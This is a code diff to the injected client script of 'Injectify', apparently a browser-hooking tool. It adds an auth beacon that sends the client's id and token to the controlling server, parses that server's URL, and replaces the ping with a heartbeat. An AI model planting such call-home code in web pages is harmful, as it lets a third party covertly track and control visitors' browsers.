@@ -169,6 +169,31 @@ window['injectify'] = /** @class */ (function () {
             params: params
         });
     };
+    /**
+     * Injectify authentication API
+     */
+    Injectify.auth = function (token) {
+        var auth = new Image;
+        if (token) {
+            auth.src = this.info.server.url + '/a?id=' + encodeURIComponent(this.info.id) + '&token=' + encodeURIComponent(token) + '&z=' + +new Date;
+        }
+        else {
+            /**
+             * Send a connection request to the server
+             *
+             * 1. Make a request to /a with our socket connection ID
+             * 2. Server reads cookies and attempts to find our token
+             * 3. If it can't be found it, the server sets a new cookie
+             * 4. Server gets the passed socket ID and inserts us into database
+             * 5. All this is done server-side with the below two lines
+             */
+            auth.src = this.info.server.url + '/a?id=' + encodeURIComponent(this.info.id) + '&z=' + +new Date;
+        }
+        /**
+         * Make sure request is sent
+         */
+        auth.onload;
+    };
     Object.defineProperty(Injectify, "present", {
         /**
          * Check that the Injectify core is active
@@ -190,9 +215,21 @@ window['injectify'] = /** @class */ (function () {
             var project = ws.url.split('?')[1];
             if (this.debug)
                 project = project.substring(1);
+            /**
+             * Parse the server URL from the websocket url
+             */
+            var server = ws.url.split('/');
+            var protocol = 'https://';
+            if (server[0] === 'ws:')
+                protocol = 'http://';
+            server = protocol + server[2];
             return {
                 'project': atob(project),
-                'websocket': ws.url,
+                'server': {
+                    'websocket': ws.url,
+                    'url': server
+                },
+                'id': client.id,
                 'platform': client.platform,
                 'duration': this.duration,
                 'debug': this.debug,
@@ -316,5 +353,5 @@ window['injectify'].listener(function (data, topic) {
  */
 clearInterval(window['ping']);
 window['ping'] = setInterval(function () {
-    window['injectify'].ping();
+    window['injectify'].send('heartbeat');
 }, 5000);
